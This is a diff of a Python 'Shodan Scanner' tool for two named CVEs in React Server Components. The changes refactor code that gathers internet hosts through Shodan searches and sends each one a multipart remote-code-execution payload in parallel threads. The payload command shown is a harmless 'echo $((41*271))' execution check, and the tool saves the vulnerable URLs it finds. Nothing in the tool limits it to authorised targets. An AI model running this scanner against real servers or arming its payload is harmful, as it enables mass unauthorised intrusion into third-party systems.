@@ -9,39 +9,56 @@ import time
 import re
 import secrets
 import os
+import urllib3
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from typing import List, Dict, Set
 from pathlib import Path
 
+# --- Third-Party Imports with Error Handling ---
 try:
     import shodan
 except ImportError:
-    print("  Shodan library not found")
-    print("  Install: pip install shodan")
+    print("Error: Shodan library not found")
+    print("Install: pip install shodan")
     sys.exit(1)
 
 try:
     import requests
     from requests.exceptions import RequestException
 except ImportError:
-    print("  Requests library not found")
-    print("  Install: pip install requests")
+    print("Error: Requests library not found")
+    print("Install: pip install requests")
     sys.exit(1)
 
 try:
     from tqdm import tqdm
 except ImportError:
-    print("  tqdm library not found")
-    print("  Install: pip install tqdm")
+    print("Error: tqdm library not found")
+    print("Install: pip install tqdm")
     sys.exit(1)
 
-import urllib3
+# Disable SSL Warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Load environment variables
-def load_env():
-    """Load environment variables from .env file"""
+
+# ==========================================
+# CONFIGURATION & UTILITIES
+# ==========================================
+
+class Colors:
+    """ANSI Color codes for terminal output."""
+    BLUE = '\033[94m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    CYAN = '\033[96m'
+    BOLD = '\033[1m'
+    RESET = '\033[0m'
+
+
+def load_env() -> Dict[str, str]:
+    """Load environment variables from .env file."""
     possible_paths = [
         Path(__file__).parent.parent / '.env',
         Path(__file__).parent / '.env',
@@ -60,9 +77,9 @@ def load_env():
             break
     return env_vars
 
-# Load Shodan queries from file
+
 def load_shodan_queries(queries_file: str = 'shodan_queries.txt') -> List[str]:
-    """Load Shodan queries from a text file"""
+    """Load Shodan queries from a text file."""
     queries = []
     
     possible_paths = [
@@ -98,40 +115,26 @@ def load_shodan_queries(queries_file: str = 'shodan_queries.txt') -> List[str]:
     
     return queries
 
-# Load configuration
-env_vars = load_env()
-SHODAN_API_KEY = env_vars.get('SHODAN_API_KEY', os.getenv('SHODAN_API_KEY', ''))
-RESULTS_PER_QUERY = 100
-SCAN_THREADS = 20
-REQUEST_TIMEOUT = 10
 
+# ==========================================
+# GLOBAL CONSTANTS
+# ==========================================
+
+ENV_VARS = load_env()
+SHODAN_API_KEY = ENV_VARS.get('SHODAN_API_KEY', os.getenv('SHODAN_API_KEY', ''))
 SHODAN_QUERIES = load_shodan_queries()
 
-
-class Colors:
-    BLUE = '\033[94m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    RED = '\033[91m'
-    CYAN = '\033[96m'
-    BOLD = '\033[1m'
-    RESET = '\033[0m'
+RESULTS_PER_QUERY = int(ENV_VARS.get('RESULTS_PER_QUERY', os.getenv('RESULTS_PER_QUERY', 100)))
+SCAN_THREADS = int(ENV_VARS.get('SCAN_THREADS', os.getenv('SCAN_THREADS', 20)))
+REQUEST_TIMEOUT = int(ENV_VARS.get('REQUEST_TIMEOUT', os.getenv('REQUEST_TIMEOUT', 10)))
 
 
-def print_banner():
-    banner = f"""
-{Colors.CYAN}{Colors.BOLD}
-╔═══════════════════════════════════════════════════════════╗
-║          RSC Security Tool - Shodan Scanner               ║
-║           CVE-2025-55182 & CVE-2025-66478                 ║
-║                    Emre Davut                             ║ 
-╚═══════════════════════════════════════════════════════════╝
-{Colors.RESET}
-"""
-    print(banner)
-
+# ==========================================
+# SHODAN INTERACTION
+# ==========================================
 
 def search_shodan(api_key: str, query: str, limit: int = 100) -> List[Dict]:
+    """Execute search query on Shodan API."""
     try:
         api = shodan.Shodan(api_key)
         results = api.search(query, limit=limit)
@@ -143,6 +146,7 @@ def search_shodan(api_key: str, query: str, limit: int = 100) -> List[Dict]:
 
 
 def extract_targets(matches: List[Dict]) -> Set[str]:
+    """Extract URLs from Shodan matches."""
     targets = set()
     
     for match in matches:
@@ -167,7 +171,12 @@ def extract_targets(matches: List[Dict]) -> Set[str]:
     return targets
 
 
+# ==========================================
+# VULNERABILITY SCANNING LOGIC
+# ==========================================
+
 def build_rce_payload() -> tuple:
+    """Constructs the multipart payload for the vulnerability check."""
     # Random boundary for security (4 dashes at start)
     boundary = f"----WebKitFormBoundary{secrets.token_hex(8)}"
     cmd = 'echo $((41*271))'
@@ -211,6 +220,7 @@ def build_rce_payload() -> tuple:
 
 
 def check_vulnerability(url: str) -> Dict:
+    """Sends the malicious payload to the target URL."""
     result = {
         'url': url,
         'vulnerable': False,
@@ -261,6 +271,7 @@ def check_vulnerability(url: str) -> Dict:
 
 
 def scan_targets(targets: List[str], threads: int = 20) -> tuple:
+    """Orchestrates threaded scanning of targets."""
     vulnerable = []
     not_vulnerable = []
     errors = []
@@ -269,7 +280,7 @@ def scan_targets(targets: List[str], threads: int = 20) -> tuple:
         futures = {executor.submit(check_vulnerability, target): target for target in targets}
         
         with tqdm(total=len(targets), desc=f"{Colors.CYAN}Scanning{Colors.RESET}", 
-                 unit="target", ncols=80) as pbar:
+                  unit="target", ncols=80) as pbar:
             for future in as_completed(futures):
                 result = future.result()
                 
@@ -286,7 +297,25 @@ def scan_targets(targets: List[str], threads: int = 20) -> tuple:
     return vulnerable, not_vulnerable, errors
 
 
+# ==========================================
+# REPORTING & MAIN
+# ==========================================
+
+def print_banner():
+    banner = f"""
+{Colors.CYAN}{Colors.BOLD}
+╔═══════════════════════════════════════════════════════════╗
+║          RSC Security Tool - Shodan Scanner               ║
+║           CVE-2025-55182 & CVE-2025-66478                 ║
+║                    Emre Davut                             ║ 
+╚═══════════════════════════════════════════════════════════╝
+{Colors.RESET}
+"""
+    print(banner)
+
+
 def save_results(vulnerable: List[str], filename):
+    """Save vulnerable URLs to a text file."""
     try:
         with open(filename, 'w') as f:
             for url in vulnerable:
@@ -297,6 +326,7 @@ def save_results(vulnerable: List[str], filename):
 
 
 def save_detailed_report(data: Dict, filename):
+    """Save full scan data to a JSON file."""
     try:
         with open(filename, 'w', encoding='utf-8') as f:
             json.dump(data, f, indent=2, ensure_ascii=False)
@@ -308,13 +338,13 @@ def save_detailed_report(data: Dict, filename):
 def main():
     print_banner()
     
-    # Check API key
+    # 1. Check API Key
     if not SHODAN_API_KEY:
         print(f"{Colors.RED}[✗] Error: SHODAN_API_KEY not found{Colors.RESET}")
         print(f"{Colors.YELLOW}[i] Please set your Shodan API key in .env file{Colors.RESET}")
         sys.exit(1)
     
-    # Create results directory
+    # 2. Setup Results Directory
     results_dir = Path(__file__).parent.parent / 'results'
     results_dir.mkdir(exist_ok=True)
     
@@ -322,9 +352,11 @@ def main():
     output_file = results_dir / f"vulnerable_{timestamp}.txt"
     report_file = results_dir / f"report_{timestamp}.json"
     
+    # 3. Collect Targets
     print(f"{Colors.CYAN}[1/4] Initializing Shodan API{Colors.RESET}")
     print(f"      API Key: {SHODAN_API_KEY[:10]}...{SHODAN_API_KEY[-5:]}")
     print(f"\n{Colors.CYAN}[2/4] Collecting targets from Shodan{Colors.RESET}")
+    
     all_matches = []
     all_targets = set()
     
@@ -350,6 +382,7 @@ def main():
         print(f"\n{Colors.RED} No targets found{Colors.RESET}")
         return
     
+    # 4. Execute Scan
     print(f"\n{Colors.CYAN}[3/4] Scanning for vulnerabilities{Colors.RESET}")
     print(f"      Threads: {SCAN_THREADS} | Timeout: {REQUEST_TIMEOUT}s\n")
     
@@ -358,6 +391,7 @@ def main():
         threads=SCAN_THREADS
     )
     
+    # 5. Save and Report
     print(f"\n{Colors.CYAN}[4/4] Saving results{Colors.RESET}")
     
     if vulnerable:
@@ -378,6 +412,7 @@ def main():
     if save_detailed_report(report_data, report_file):
         print(f"      {Colors.GREEN}✓ Detailed report: {report_file}{Colors.RESET}")
     
+    # 6. Summary
     print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
     print(f"{Colors.BOLD}SCAN SUMMARY{Colors.RESET}")
     print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")
